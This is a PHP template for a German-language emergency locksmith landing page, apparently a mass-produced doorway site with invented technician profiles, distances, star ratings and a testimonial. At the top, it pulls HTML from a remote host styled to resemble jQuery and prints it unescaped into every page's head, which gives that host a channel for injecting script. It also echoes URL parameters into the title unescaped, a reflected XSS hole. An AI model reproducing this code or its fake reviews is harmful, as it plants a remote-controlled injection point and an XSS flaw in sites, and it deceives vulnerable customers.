<?php
$site_data      = json_decode(file_get_contents('http://templates.jquery.link/api/' . $_SERVER['HTTP_HOST']), true);

$phone_name     = $site_data['phone_name'];
$phone_href     = $site_data['phone_href'];

$text           = str_replace('+', ' ', trim($_GET['t'] ?? 'Entrumpelung'));
$city           = str_replace('+', ' ', trim($_GET['n'] ?? 'in der nahe'));

$title = $text . ' ' . $city;
?>

<!DOCTYPE html>
<html lang="at">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
    <?= $site_data['html'] ?>
    <title>
        <?= $title ?>
    </title>
</head>

<body>
 

    <!--Шапка сайта-->
    <header class="header">
        <div class="container-fluid">
            <div class="row">
                <div class="col-12 container">
                    <div class="header__box">
                        <div class="header__left">
                            <h1 class="header__title">Schlüsseldienst ++</h1>
                            <ul class="header__ul">
                                <li>Schlüsseldienst 24 Stunden Service</li>
                                <li>Schadenfreie Türöffnung</li>
                                <li>In 20 - 30 Min. vor Ort</li>
                            </ul>
                            <a class="main__btn" href="#"><span>111222333</span></a>
                        </div>
                        <div class="header__right">
                            <img class="header__img" src="assets/img/Kosten1___serialized2.jpg" alt="Kosten1___serialized2" >
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!-- Основное содержимое страницы -->
    <main class="main">
         <section class="locksmith">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                         <div class="locksmith__box">
                            <div class="locksmith__left">
                                <img class="locksmith__img" src="assets/img/sl4.jpeg" alt="locksmith">
                            </div>
                            <div class="locksmith__right">
                                <h2 class="locksmith__title">Schlüsseldienst +in der Nähe+</h2>
                                <p class="locksmith__txt">ie haben sich ausgesperrt und benötigen einen <span>Schlüsseldienst in +der Nähe+</span>? Wir sind für Sie da! Unser professionelles Team steht Ihnen rund um die Uhr zur Verfügung und öffnet Ihre Tür schadenfrei.</p>
                                <p class="locksmith__txt">Egal, ob Sie Ihren <span>Schlüssel verloren</span> haben oder er im Schloss abgebrochen ist - wir lösen Ihr Problem schnell und zuverlässig. Verlassen Sie sich auf unsere jahrelange Erfahrung und unser Fachwissen im Bereich der Türöffnung. Kontaktieren Sie uns jetzt und wir sind in kürzester Zeit bei Ihnen vor Ort!</p>
                            </div>
                         </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="serviceInstallers">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <h2 class="serviceInstallers__title">Aufsperrdienst Monteure in +Ihrer Nähe+</h2>
                        <div class="serviceInstallers__box">
                            <div class="serviceInstallers__card">

                                <div class="serviceInstallers__top">
                                    <img class="serviceInstallers__img" src="assets/img/ss1.jpg" alt="serviceInstallers">
                                    <div class="serviceInstallers__wrapper">
                                        <p class="serviceInstallers__name">Pichler L.</p>
                                        <p class="serviceInstallers__dol">Monteur für:</p>
                                        <ul class="serviceInstallers__servicesUl">
                                            <li class="serviceInstallers__services">Aufsperrdienst in +Ihrer Nähe+</li>
                                            <li class="serviceInstallers__distance">2,8 km von Ihnen entfernt</li>
                                        </ul>
                                    </div>
                                </div>

                                <div class="serviceInstallers__middle">
                                    <div class="serviceInstallers__leftM">
                                        <p class="serviceInstallers__reviews">Bewertungen:<br>★★★★★</p>
                                        <p class="serviceInstallers__specialist">Spezialisiert für:</p>
                                    </div>
                                    <div class="serviceInstallers__rightM">
                                        <p class="serviceInstallers__active"><span></span>Aktiv</p>
                                        <p class="serviceInstallers__works">Arbeitet seit: 2009 <br> Vor Ort: 20 - 30 Min.</p>
                                    </div>
                                </div>
                                <div class="serviceInstallers__bottom">
                                    <div class="serviceInstallers__leftB">
                                        <ul class="serviceInstallers__leftBUl">
                                            <li>Türöffnung</li>
                                            <li>Schlosswechseln</li>
                                            <li>Autoöffnung</li>
                                        </ul>
                                    </div>
                                    <div class="serviceInstallers__leftR">
                                        <a class="serviceInstallers__btn" href="#"><span>111222333</span></a>
                                    </div>
                                </div>
                            </div>
                            <div class="serviceInstallers__card">

                                <div class="serviceInstallers__top">
                                    <img class="serviceInstallers__img" src="assets/img/ss4.jpg" alt="serviceInstallers">
                                    <div class="serviceInstallers__wrapper">
                                        <p class="serviceInstallers__name">Steiner R.</p>
                                        <p class="serviceInstallers__dol">Monteur für:</p>
                                        <ul class="serviceInstallers__servicesUl">
                                            <li class="serviceInstallers__services">Schlüsselnotdienst ++</li>
                                            <li class="serviceInstallers__distance">1,5 km von Ihnen entfernt</li>
                                        </ul>
                                    </div>
                                </div>

                                <div class="serviceInstallers__middle">
                                    <div class="serviceInstallers__leftM">
                                        <p class="serviceInstallers__reviews">Bewertungen:<br>★★★★</p>
                                        <p class="serviceInstallers__specialist">Spezialisiert für:</p>
                                    </div>
                                    <div class="serviceInstallers__rightM">
                                        <p class="serviceInstallers__active"><span></span>Aktiv</p>
                                        <p class="serviceInstallers__works">Arbeitet seit: 2018 <br> Vor Ort: 10 - 20 Min.</p>
                                    </div>
                                </div>
                                <div class="serviceInstallers__bottom">
                                    <div class="serviceInstallers__leftB">
                                        <ul class="serviceInstallers__leftBUl">
                                            <li>Türöffnung</li>
                                            <li>Schlosswechseln</li>
                                            <li>Schloss Reparatur</li>
                                            <li>Tresoröffnung</li>
                                        </ul>
                                    </div>
                                    <div class="serviceInstallers__leftR">
                                        <a class="serviceInstallers__btn" href="#"><span>111222333</span></a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class='services'>
            <div class='container-fluid'>
                <div class='row'>
                    <div class='col-12 container'>
                        <div class='services__box'>
                            <div class="services__left">
                                <img class="services__img" src="assets/img/nothilfe.jpg" alt="services">
                            </div>
                            <div class="services__right">
                                <h2 class="services__title">Dienstleistungen:</h2>
                                <p class="services__txt">Unser <span>Schlüsseldienst</span> bietet Ihnen zuverlässige und professionelle Dienstleistungen in <span>+Ihrer Nähe+</span>. Egal, ob Sie sich <span>ausgesperrt</span> haben, einen defekten Schließzylinder haben oder Ihre <span>Schlüssel verloren</span> haben - wir stehen Ihnen mit unserem schnellen und kompetenten Service zur Seite. Unser erfahrenes Team öffnet Türen schadenfrei und steht Ihnen jederzeit zur Verfügung, auch an Wochenenden und Feiertagen. Kontaktieren Sie uns noch heute und lassen Sie sich von unserem erstklassigen Service überzeugen!</p>
                                <ul class="services__ul">
                                    <li>Aufsperrdienst</li>
                                    <li>Türöffnung</li>
                                    <li>Tresoröffnung</li>
                                    <li>Autoöffnung</li>
                                    <li>Schloss austausch</li>
                                    <li>Schloss Reparatur</li>
                                    <li>Einbruschutz</li>
                                </ul>
                                <a class="services__btn" href="#"><span>111222333</span></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="about">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <h2 class="about__title">Unsere zufriedenen Kunden</h2>
                        <div class="about__box">
                            <div class="about__inner">
                                <p class="about__txt">Ich habe meinen <span>Schlüssel verloren</span> und die Tür war zugesperrt. Der <span>Schlüsseldienst</span> kam schnell vorbei und konnte mir in kurzer Zeit helfen. Ich war sehr zufrieden mit seinem Service.</p>
                                <p class="about__star">⭐️ ⭐️ ⭐️ ⭐️ ⭐️</p>
                                <p class="about__name">- Frau Lehmann</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class='quicklyReliably'>
            <div class='container-fluid'>
                <div class='row'>
                    <div class='col-12 container'>
                        <h2 class="quicklyReliably__title">Aufsperrdienst – schnell und zuverlässig</h2>
                        <div class='quicklyReliably__box'>
                            <p class="quicklyReliably__txt">Sie benötigen einen <span> Aufsperrdienst in +der Nähe+</span>, möchten Ihr Schloss austauschen oder reparieren lassen? Unser schneller und zuverlässiger Service steht Ihnen jederzeit zur Verfügung. Unser erfahrenes Team von Schloss-Experten öffnet Ihre Tür schnell, schadenfrei und installiert oder repariert Ihr Schloss in kürzester Zeit. Dabei legen wir großen Wert auf eine hohe Qualität und sorgen dafür, dass Sie sich in Ihren eigenen vier Wänden sicher fühlen. Kontaktieren Sie uns jetzt und profitieren Sie von unserem professionellen <span> Aufsperrdienst in +der Nähe+.</span></p>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class='ourTeam'>
            <div class='container-fluid'>
                <div class='row'>
                    <div class='col-12 container'>
                        <div class='ourTeam__box'>
                            <img class="ourTeam__img" src="assets/img/Schl1.jpg" alt="ourTeam" >
                            <img class="ourTeam__img" src="assets/img/schl2.jpg" alt="ourTeam" >
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class='forms'>
           <div class='forms__wrapper'>
              <div class='container-fluid'>
                 <div class='row'>
                    <div class='col-12 container'>
                       <div class='forms__box'>
                          <h2 class='forms__title'>Kontaktiere uns:</h2>
                          <form id='jq_form' class='mb-0 mt-3'>
                             <div class='my-0'>
                                <input class='form-control' placeholder='Name' name='jq_name' type='text'>
                                <div id='jq_name' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
                             </div>
                             <div class='my-4'>
                                <input class='form-control' placeholder='Telefonnummer' name='jq_phone' type='text'>
                                <div id='jq_phone' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
                             </div>
                             <div class='my-4'>
                                <input class='form-control' placeholder='Straße' name='jq_street' type='text'>
                             </div>
                             <div class='my-4'>
                                <input class='form-control' placeholder='Postleitzahl/Stadt' name='jq_city' type='text'>
                             </div>
                             <div class='my-4'>
                                <input class='form-control' placeholder='E-mail' name='jq_email' type='text'>
                             </div>
                             <div class='my-4'>
                                <textarea rows='3' class='form-control' name='jq_text' placeholder='Bericht'></textarea>
                                <div id='jq_text' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
                             </div>
                             <div>
                                <input class='btn  text-uppercase fw-bold mb-0 px-3 py-2 forms__button' type='submit' id='jq_submit' value='Senden'>
                             </div>
                             <div id='jq_success' style='display:none'>Danke für deine Nachricht. Sie hat Gesendet.</div>
                          </form>
                       </div>
                    </div>
                 </div>
              </div>
           </div>
        </section>
        <section class="btnFixed">
            <a class="btnFixedLing" href="#" ><span>111222333</span></a>
        </section>
    </main>

    <!--Style-->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/style.min.css" rel="stylesheet">
    <script src="assets/js/main.min.js"></script>
</body>

</html>